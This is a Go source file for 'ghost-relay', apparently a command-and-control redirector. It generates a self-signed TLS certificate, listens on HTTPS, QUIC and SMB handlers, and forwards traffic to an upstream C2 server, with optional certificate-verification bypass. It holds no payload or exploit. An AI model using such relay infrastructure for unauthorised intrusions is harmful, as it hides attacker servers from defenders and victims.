package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"ghost-relay/internal/config"
)

// Global variables for use in accept.go
var (
	cfg        *config.Config
	cert       *tls.Certificate
	logger     *log.Logger
	httpClient *http.Client // Shared HTTP client to prevent socket leaks
	handlers   []acceptHandler // Registry of all active handlers for proper shutdown
)

// acceptHandler interface for tracking handlers
type acceptHandler interface {
	Stop() error
}

func loadOrGenerateCert() (*tls.Certificate, error) {
	// Check if certificate files exist
	if _, err := os.Stat("server.crt"); err == nil {
		if _, err := os.Stat("server.key"); err == nil {
			// Load existing certificate from files
			tlsCert, err := tls.LoadX509KeyPair("server.crt", "server.key")
			if err != nil {
				return nil, fmt.Errorf("failed to load certificate files: %w", err)
			}
			log.Printf("Loaded existing TLS certificate from server.crt and server.key")
			return &tlsCert, nil
		}
	}

	// Generate new certificate in memory
	log.Printf("No certificate files found, generating self-signed certificate in memory")
	
	// Generate private key
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Get all local IP addresses
	localIPs := []net.IP{net.IPv4(127, 0, 0, 1), net.IPv6loopback}
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip != nil && !ip.IsLoopback() {
					localIPs = append(localIPs, ip)
				}
			}
		}
	}

	// Get hostname for DNS name
	hostname, _ := os.Hostname()
	dnsNames := []string{"localhost"}
	if hostname != "" && hostname != "localhost" {
		dnsNames = append(dnsNames, hostname)
	}

	// Create certificate template
	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Ghost Relay"},
			Country:      []string{"US"},
			Locality:     []string{"San Francisco"},
		},
		NotBefore:   time.Now(),
		NotAfter:    time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:    x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses: localIPs,
		DNSNames:    dnsNames,
	}

	// Create certificate
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}

	// Encode to PEM
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	// Create TLS certificate
	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}

	return &tlsCert, nil
}

func main() {
	// Parse command-line flags
	upstreamURL := flag.String("upstream", "", "Upstream C2 server URL (e.g., https://10.0.0.1:8444)")
	bindAddr := flag.String("bind", "", "Base bind address/interface (e.g., 0.0.0.0, 127.0.0.1, or 192.168.1.5)")
	flag.Parse()

	var err error
	cfg, err = config.Load(*upstreamURL, *bindAddr)
	if err != nil {
		log.Fatalf("failed to load config: %v", err)
	}

	logger = log.New(os.Stdout, "[ghost-relay] ", log.LstdFlags)

	// Print ASCII art banner
	fmt.Print(`
   (` + "`" + `-')  (` + "`" + `-')  _         (` + "`" + `-')  _            
<-.(OO )  ( OO).-/  <-.    (OO ).-/      .->   
,------,)(,------.,--. )   / ,---.   ,--.'  ,-.
|   /` + "`" + `. ' |  .---'|  (` + "`" + `-') | \ /` + "`" + `.\ (` + "`" + `-')'.'  /
|  |_.' |(|  '--. |  |OO ) '-'|_.' |(OO \    / 
|  .   .' |  .--'(|  '__ |(|  .-.  | |  /   /) 
|  |\  \  |  ` + "`" + `---.|     |' |  | |  | ` + "`" + `-/   /` + "`" + `  
` + "`" + `--' '--' ` + "`" + `------'` + "`" + `-----'  ` + "`" + `--' ` + "`" + `--'   ` + "`" + `--'    

`)

	// Load existing certificate from files or generate new one in memory
	cert, err = loadOrGenerateCert()
	if err != nil {
		log.Fatalf("failed to load or generate certificate: %v", err)
	}

	// Initialize shared HTTP client with proper connection pooling
	// This prevents socket leaks by reusing connections instead of creating new transports per request
	httpClient = &http.Client{
		Timeout: cfg.ClientTimeout, // Overall request timeout (default: 15s)
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: cfg.InsecureSkipVerify,
			},
			// Connection limits
			MaxIdleConns:        100,              // Maximum total idle connections
			MaxIdleConnsPerHost: 10,               // Maximum idle connections per host
			MaxConnsPerHost:     50,               // Maximum total connections per host
			IdleConnTimeout:     90 * time.Second, // How long idle connections are kept
			DisableKeepAlives:   false,            // Enable connection reuse
			
			// Critical timeouts to prevent socket leaks
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,  // Max time to establish TCP connection
				KeepAlive: 30 * time.Second, // TCP keepalive interval
			}).DialContext,
			TLSHandshakeTimeout:   10 * time.Second, // Max time for TLS handshake
			ResponseHeaderTimeout: 10 * time.Second, // Max time waiting for response headers
			ExpectContinueTimeout: 1 * time.Second,  // Max time waiting for 100-continue
			
			// Enable HTTP/2 for connection multiplexing (reduces socket usage)
			ForceAttemptHTTP2: true,
		},
	}

	logger.Printf("Starting Ghost Relay, forwarding to %s", cfg.UpstreamBaseURL)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	// Setup accept handlers (HTTPS, QUIC, SMB, etc.)
	if err := setupAcceptHandlers(ctx); err != nil {
		log.Fatalf("failed to setup accept handlers: %v", err)
	}

	// Start periodic idle connection cleanup to prevent stale connections
	go func() {
		ticker := time.NewTicker(60 * time.Second) // Every minute
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				if transport, ok := httpClient.Transport.(*http.Transport); ok {
					transport.CloseIdleConnections()
				}
			}
		}
	}()

	// Wait for shutdown signal
	<-ctx.Done()
	logger.Printf("shutdown signal received")

	// Stop all accept handlers
	logger.Printf("shutting down %d accept handlers...", len(handlers))
	for i, handler := range handlers {
		if err := handler.Stop(); err != nil {
			logger.Printf("error stopping handler %d: %v", i, err)
		}
	}
	logger.Printf("all accept handlers stopped")

	// Close idle connections in the HTTP client transport
	if transport, ok := httpClient.Transport.(*http.Transport); ok {
		transport.CloseIdleConnections()
		logger.Printf("closed idle HTTP connections")
	}
}
